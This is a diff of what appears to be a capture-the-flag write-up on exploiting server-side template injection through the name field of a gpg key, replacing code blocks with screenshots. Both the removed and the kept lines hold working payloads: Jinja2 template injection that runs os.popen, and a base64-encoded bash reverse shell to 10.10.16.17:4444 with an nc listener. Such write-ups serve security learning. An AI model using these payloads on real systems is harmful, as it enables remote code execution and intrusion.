@@ -45,11 +45,7 @@ gpg --gen-key
 
 #### First Try
 Try SSTI in real name field is vulnerable to SSTI (Server Side Template Injection). So for testing I put SSTI payload in the name field. If it is vulnerable then it will give output `49` as a name.
-```
-Real name: {{7*7}}
-Email: anymail
-password: A1234567
-```
+![](/assets/img/posts/1-ssti.png)
 
 Checking all generate Keys.
 ```
@@ -97,17 +93,14 @@ gpg --list-key
 ```
 
 Then I again generate keys but this time the payload will be different. In the name field I put this payload below:
-```
-{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
-```
+
+![](/assets/img/posts/2-ssti.png)
+
 
 #### Second Try
-```
-gpg --gen-key
-Real name: {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
-Email: abdo@gmail.com
-password: A1234567
-```
+
+![](/assets/img/posts/3-ssti.png)
+
 
 Then we have to make our **Public Key** with the following command for Encryption.
 ```
@@ -142,9 +135,9 @@ echo "bash -i >& /dev/tcp/10.10.16.17/4444 0>&1" | base64
 Result: `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNy80NDQ0IDA+JjEK`
 
 The final payload:
-```
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNy80NDQ0IDA+JjEK" | base64 -d | bash').read() }}
-```
+
+![](/assets/img/posts/4-ssti.png)
+
 
 First, make our listener
 ```
@@ -152,12 +145,9 @@ nc -nvlp 4444
 ```
 
 #### Third Try
-```
-gpg --gen-key
-Real name: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNy80NDQ0IDA+JjEnCg==" | base64 -d | bash').read() }}
-Email: abdo@gmail.com
-password: A1234567 Admin123
-```
+
+![](/assets/img/posts/5-ssti.png)
+
 
 Then we have to make our Public Key with the following command for Encryption
 ```
